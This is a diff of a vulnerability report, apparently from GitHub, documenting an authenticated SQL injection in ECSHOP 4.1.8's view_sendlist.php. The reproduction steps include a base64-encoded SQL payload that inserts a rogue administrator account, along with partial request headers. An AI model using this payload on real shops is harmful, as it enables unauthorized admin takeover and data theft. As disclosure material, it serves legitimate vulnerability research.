@@ -4,10 +4,12 @@ ECSHOP, 4.1.8, SQL Injection
 
 Vulnerabilities Reproduction:
 
-1. Log in to the backend, visit the view_ sendlist.php, and then capture the packet
+1. Log in to the backend, visit the view_ sendlist.php, and then capture the packet.
 
 2. Enter the SQL statement to be executed, and then convert it into base64 encoding. Here we take adding the test administrator user as an example.
+   
 <img width="415" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/235fd585-510c-48a4-b749-163d3765b972">
+
 Here is the base64 encoding.
 aW5zZXJ0IGludG8gZWNzX2FkbWluX3VzZXIodXNlcl9uYW1lLGVtYWlsLHBhc3N3b3JkLGFjdGlvbl9saXN0LG5hdl9saXN0LGFnZW5jeV9pZCkgdmFsdWVzKCd0ZXN0JywnMTIzMTIzQDEyMy5jb20nLCc0ZmNlZDlhYTY2YzQzZTVmYzg3ZDVmOTE3NjIwMWViMycsJzEnLCcxJywnMScpOyM=
 
@@ -31,8 +33,11 @@ Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: none
 Sec-Fetch-User: ?1
+
 <img width="484" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/165d612d-27e7-4d54-9ac8-0e4cac2e9b68">
+
 <img width="489" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/43846d1c-9192-415f-a0fa-9335f730d9e2">
+
 
 4. Refresh the database and find that the user is successfully added, or the logged-in user finds that he can also log in successfully.
    <img width="752" alt="image" src="https://github.com/curlyyyyyyyy/ecshop/assets/155808433/f4c894ca-e513-4499-b0a1-ee64c01dac15">
